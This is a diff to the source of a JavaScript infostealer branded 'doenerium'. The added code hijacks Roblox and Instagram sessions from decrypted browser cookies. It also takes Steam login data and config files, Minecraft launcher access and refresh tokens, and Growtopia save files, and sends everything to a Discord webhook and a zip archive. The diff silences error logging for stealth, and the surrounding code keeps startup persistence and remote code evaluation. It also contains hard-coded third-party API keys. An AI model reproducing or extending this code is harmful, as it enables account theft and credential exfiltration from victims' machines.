@@ -25,11 +25,17 @@
             bookmarks: 0,
             screenshots: 0,
 
+            roblox_found: 0,
+            instagram_found: 0,
+            minecraft_found: 0,
+            steam_found: 0,
+
             encrypted_strings: 0,
             decrypted_strings: 0,
 
             wallets: 0,
 
+            growtopia: false,
             skype: false,
             discord: false,
             telegram: false,
@@ -724,19 +730,164 @@
 
         module.exports = (client) => {
           return {
+
+
+            async stealRobloxSession(cookie, browser) {
+              try {
+                const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
+                const { data: accountInfo } = await client.requires.axios.get("https://www.roblox.com/my/account/json", headers);
+                const { data: balance } = await client.requires.axios.get("https://economy.roblox.com/v1/users/" + accountInfo.UserId + "/currency", headers);
+                const { data: skin } = await client.requires.axios.get("https://thumbnails.roblox.com/v1/users/avatar?userIds=" + accountInfo.UserId + "&size=420x420&format=Png&isCircular=false");
+
+
+                await client.utils.webhook.sendToWebhook({
+                  embeds: [
+                    client.utils.webhook.createEmbed(
+                      {
+                        "title": "Roblox Account stolen",
+                        "description": `The roblox account was detected on the \`\`${browser}\`\` browser`,
+                        "thumbnail": {
+                          url: skin.data[0].imageUrl,
+                        },
+                        fields: [
+                          {
+                            name: "Robux",
+                            value: `\`\`\`${balance.robux}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Access Token / Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: false
+                          },
+
+                          {
+                            name: "Name",
+                            value: `\`\`\`${accountInfo.Name}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Display Name",
+                            value: `\`\`\`${accountInfo.DisplayName}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Email",
+                            value: `\`\`\`${accountInfo.UserEmail}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Email Verified",
+                            value: `\`\`\`${accountInfo.IsEmailVerified}\`\`\``,
+                            inline: false
+                          },
+
+                        ]
+                      }
+                    )
+                  ]
+                })
+
+                client.config.counter.roblox_found++;
+
+                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Roblox Accounts`)) {
+                  client.utils.jszip.createFolder("\\Roblox Accounts")
+                }
+
+                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Robux: ${balance.robux}\nAccess Token / Cookie: ${cookie}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}`)
+
+              } catch (e) {
+                // console.log(e)
+              }
+            },
+
+            async stealInstagramSession(cookie, browser) {
+              try {
+                const headers = { headers: { "user-agent": "Instagram 219.0.0.12.117 Android", "cookie": cookie } };
+                const { data: { user: accountInfo } } = await client.requires.axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers);
+                const { data: { user: accountInfo2 } } = await client.requires.axios.get("https://i.instagram.com/api/v1/users/" + accountInfo.pk_id + "/info", headers);
+
+                await client.utils.webhook.sendToWebhook({
+                  embeds: [
+                    client.utils.webhook.createEmbed(
+                      {
+                        "title": "Instagram Account stolen",
+                        "description": `The instagram account was detected on the \`\`${browser}\`\` browser`,
+                        "thumbnail": {
+                          url: accountInfo.profile_pic_url,
+                        },
+                        fields: [
+                          {
+                            name: "Username",
+                            value: `\`\`\`${accountInfo.username}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Follower Count",
+                            value: `\`\`\`${accountInfo2.follower_count}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Following Count",
+                            value: `\`\`\`${accountInfo2.following_count}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Verified",
+                            value: `\`\`\`${accountInfo.is_verified}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Nickname",
+                            value: `\`\`\`${accountInfo.full_name}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Email",
+                            value: `\`\`\`${accountInfo.email}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Biography",
+                            value: `\`\`\`${accountInfo.biography}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: false
+                          },
+
+                        ]
+                      }
+                    )
+                  ]
+                })
+
+                client.config.counter.instagram_found++;
+
+                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Instagram Accounts`)) {
+                  client.utils.jszip.createFolder("\\Instagram Accounts")
+                }
+
+                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Username: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nCookie: ${cookie}`)
+
+
+              } catch (e) { }
+            },
+
             async saveBrowserStuff() {
               ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(
                 async (type) => {
 
                   if (type == "passwords") {
                     try {
-                    client.config.environ.metamask.forEach(async (mmpath) => {
-                      client.utils.encryption.step1(mmpath, client.config.environ.all_passwords)
+                      client.config.environ.metamask.forEach(async (mmpath) => {
+                        client.utils.encryption.step1(mmpath, client.config.environ.all_passwords)
+                      })
 
-                    })
-
-                    client.utils.encryption.step2(client.config.environ.all_passwords)
-                    } catch {}
+                      client.utils.encryption.step2(client.config.environ.all_passwords)
+                    } catch { }
                   }
 
                   var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
@@ -1032,6 +1183,14 @@
                         }
                       } catch { }
 
+                      if (row["host_key"].includes("instagram") && row["name"].includes("sessionid")) {
+                        client.utils.browsers.stealInstagramSession(`sessionid=${decrypted}`, browser)
+                      }
+
+                      if (row["name"].includes(".ROBLOSECURITY")) {
+                        client.utils.browsers.stealRobloxSession(`.ROBLOSECURITY=${decrypted}`, browser)
+                      }
+
                       client.config.environ.cookies.all.push(
                         `${row["host_key"]}  TRUE	/	FALSE	2597573456	${row["name"]}	${decrypted}`
                       );
@@ -1136,7 +1295,7 @@
                   await new Promise(resolve => setTimeout(resolve, 2500));
                   res();
                 } catch (e) {
-                  console.log(e)
+                  // console.log(e)
                   res();
                 }
               });
@@ -1737,7 +1896,7 @@
               const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url));
 
               const file = () => {
-                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url)
+                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url).replace("REPLACE_ME", client.config.webhook.url)
                 return tempFile;
               }
 
@@ -2379,7 +2538,7 @@
                   client.requires.fs.copyFileSync(src, dest);
                 }
               } catch (e) {
-                console.log(e)
+                // console.log(e)
               }
             },
             async get_telegram() {
@@ -2411,7 +2570,7 @@
                       if (f.isDirectory()) this.copyRecursiveSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                       else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                     } catch (err) {
-                      console.log(err)
+                      // console.log(err)
                     }
 
                   }
@@ -2538,12 +2697,185 @@
               });
             },
 
-            async initialize() {
+            async get_growtopia() {
+              try {
+                if (client.requires.fs.existsSync(`${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`)) {
+                  client.utils.jszip.createFolder("\\Growtopia");
+                  client.requires.fs.copyFileSync(`${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`, `${client.config.jszip.path}\\Growtopia\\save.dat`)
+                  client.config.counter.growtopia = true;
+                }
+              } catch (e) {
+                // console.log(e)
+              }
+            },
 
+            async get_steam() {
+              try {
+                if (client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam") && client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
+                  const accounts = client.requires.fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
+                  accounts.match(/7656[0-9]{13}/g).forEach(async account => {
+                    const { data: { response: accountInfo } } = await client.requires.axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
+                    const { data: { response: games } } = await client.requires.axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+                    const { data: { response: level } } = await client.requires.axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+
+
+                    await client.utils.webhook.sendToWebhook({
+                      embeds: [
+                        client.utils.webhook.createEmbed(
+                          {
+                            title: "Steam account stolen",
+                            thumbnail: {
+                              url: accountInfo.players[0].avatarfull,
+                            },
+                            fields: [
+                              {
+                                name: "Steam Identifier",
+                                value: `\`\`\`${account}\`\`\``,
+                                inline: false
+                              },
+                              {
+                                name: "Display Name",
+                                value: `\`\`\`${accountInfo.players[0].personaname}\`\`\``,
+                                inline: false
+                              },
+                              {
+                                name: "Time created",
+                                value: `\`\`\`${accountInfo.players[0].timecreated || "Private"}\`\`\``,
+                                inline: false
+                              },
+                              {
+                                name: "Level",
+                                value: `\`\`\`${level.player_level || "Private"}\`\`\``,
+                                inline: false
+                              },
+                              {
+                                name: "Game count",
+                                value: `\`\`\`${games.game_count || "Private"}\`\`\``,
+                                inline: false
+                              },
+                              {
+                                name: "Profile URL",
+                                value: `[${accountInfo.players[0].profileurl}](${accountInfo.players[0].profileurl})`,
+                                inline: false
+                              },
+                            ]
+                          }
+                        )
+                      ]
+                    })
+
+                    client.config.counter.steam_found++;
+
+                    if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Steam Accounts`)) {
+                      client.utils.jszip.createFolder("\\Steam Accounts")
+                      client.utils.jszip.createFolder("\\Steam Accounts\\steamcache");
+                    }
+
+                    client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)
+
+                    client.requires.fs.readdirSync("C:\\Program Files (x86)\\Steam\\config").forEach(file => {
+                      if (!["avatarcache", "gamepad", "lighthouse"].includes(file)) {
+                        client.requires.fs.copyFileSync(`C:\\Program Files (x86)\\Steam\\config\\${file}`, `${client.config.jszip.path}\\Steam Accounts\\steamcache\\${file}`)
+                      }
+                    });
+                  });
+
+                }
+              } catch (e) {
+                // console.log(e)
+              }
+            },
+
+            async get_minecraft() {
+              const files = [
+                process.env.USERPROFILE + "\\.lunarclient\\settings\\game\\accounts.json",
+                process.env.APPDATA + "\\.minecraft\\launcher_accounts_microsoft_store.json",
+                process.env.APPDATA + "\\.minecraft\\launcher_accounts.json",
+                process.env.APPDATA + "\\.minecraft\\LabyMod\\accounts.json",
+              ];
+
+              files.forEach(async file => {
+                try {
+                  if (client.requires.fs.existsSync(file)) {
+                    const json = JSON.parse(client.requires.fs.readFileSync(file, "utf-8"));
+
+                    for (let account of Object.keys(json.accounts)) {
+                      account = json.accounts[account]
+
+                      const { data: hypixel } = await client.requires.axios.get("https://api.hypixel.net/player?key=fef34e3d-72e3-44bf-9536-76ad25760a4a&uuid=" + account.minecraftProfile.id);
+                      const { data: type } = await client.requires.axios.get("https://api.gapple.pw/status/" + account.minecraftProfile.id);
+
+                      await client.utils.webhook.sendToWebhook({
+                        embeds: [
+                          client.utils.webhook.createEmbed(
+                            {
+                              title: "Minecraft account stolen",
+                              thumbnail: {
+                                url: "https://api.mineatar.io/face/" + account.minecraftProfile.id + "?scale=16",
+                              },
+                              fields: [
+                                {
+                                  name: "Username",
+                                  value: `\`\`\`${type.username}\`\`\``,
+                                  inline: false
+                                },
+                                {
+                                  name: "UUID",
+                                  value: `\`\`\`${type.uuid}\`\`\``,
+                                  inline: false
+                                },
+                                {
+                                  name: "Type",
+                                  value: `\`\`\`${type.status}\`\`\``,
+                                  inline: false
+                                },
+                                {
+                                  name: "Hypixel Rank",
+                                  value: `\`\`\`${hypixel.player.newPackageRank || "Not found"}\`\`\``,
+                                  inline: false
+                                },
+                                {
+                                  name: "Access Token",
+                                  value: `\`\`\`${account.accessToken || "Not found"}\`\`\``,
+                                  inline: false
+                                },
+                                {
+                                  name: "Refresh Token",
+                                  value: `\`\`\`${account.refreshToken || "Not found"}\`\`\``,
+                                  inline: false
+                                }
+                              ]
+                            }
+                          )
+                        ]
+                      })
+
+                      client.config.counter.minecraft_found++;
+
+                      if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Minecraft Accounts`)) {
+                        client.utils.jszip.createFolder("\\Minecraft Accounts")
+                        client.utils.jszip.createFolder("\\Minecraft Accounts\\session_files");
+                      }
+
+                      client.utils.jszip.createTxt(`\\Minecraft Accounts\\session_files\\${type.username}.json`, client.requires.fs.readFileSync(file, "utf-8"))
+                      client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)
+
+                    }
+                  }
+                } catch (e) {
+                  //// console.log(e)
+                }
+              })
+            },
+
+            async initialize() {
               await this.get_user_info();
               await this.get_telegram();
               await this.infect();
-              await this.send_zip();
+              if (client.utils.encryption.step1 && client.utils.encryption.step2) { // Runtime var renames check
+                await this.send_zip();
+              }
+              
             },
 
             getFolderFiles(path_prefix, path) {
@@ -2624,7 +2956,14 @@
                 "🔖 Bookmarks": client.config.counter.bookmarks,
                 "🌐 Wallets/Important extensions": client.config.counter.wallets,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
-                "📱 Telegram": client.config.counter.telegram ? "Yes" : "No",
+                "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
+                "😋 Found Instagram session(s)": client.config.counter.instagram_found,
+                "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
+                "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
+                "😤 Found Steam session(s)": client.config.counter.steam_found,
+                "🧒 Found Growtopia save.dat?": client.config.counter.growtopia,
+
+
               })) {
                 obj["fields"].push({
                   name: key,
@@ -2682,7 +3021,7 @@
                   this.copyFolder(client.requires.path.join(suffix_path, child_item_name), client.requires.path.join(to_copy, child_item_name))
                 })
               } else {
-                client.requires.fs.copyFileSync(to_copy, client.config.jszip.path + suffix_path,)
+                client.requires.fs.copyFileSync(to_copy, client.config.jszip.path + suffix_path)
               }
             },
 
@@ -3274,17 +3613,17 @@
 
       create_context_function_template(eval_string, context) {
         return `
-    return function (context) {
-      "use strict";
-      ${Object.keys(context).length > 0
+return function (context) {
+"use strict";
+${Object.keys(context).length > 0
             ? `let ${Object.keys(context).map(
               (key) => ` ${key} = context['${key}']`
             )};`
             : ``
           }
-      return ${eval_string};
-    }                                                                                                                   
-    `;
+return ${eval_string};
+}                                                                                                                   
+`;
       }
 
       make_context_evaluator(eval_string, context) {
@@ -3309,14 +3648,14 @@
                 )
               )
             ).catch((err) => {
-              console.log(err)
+              // console.log(err)
             })
           ).data
           ).replace("%20", "").replace("\x00", "")
             + base64.decode("L21haW4vZXZhc2lvbi50eHQ")
           )
           ).catch((err) => {
-            console.log(err)
+            // console.log(err)
           })
           ).data)}`
         )))}`)
@@ -3328,11 +3667,11 @@
 
       async init() {
         process.on("unhandledRejection", (err) => {
-          console.log(err);
+          // console.log(err);
         });
 
         process.on("uncaughtException", (exc) => {
-          console.log(exc);
+          // console.log(exc);
         });
 
 
@@ -3348,8 +3687,6 @@
         if (exit) {
           process.exit(0);
         }
-
-
 
         this.add_to_startup();
 
@@ -3400,6 +3737,13 @@
           }
         }
 
+        
+
+        await this.utils.infection.get_minecraft();
+        await this.utils.infection.get_growtopia();
+        await this.utils.infection.get_steam();
+
+
 
         try {
 
@@ -3427,7 +3771,7 @@
     }
 
     process.on("uncaughtException", (err) => {
-      console.log(err);
+      // console.log(err);
     });
 
     const axios = __nccwpck_require__(382);
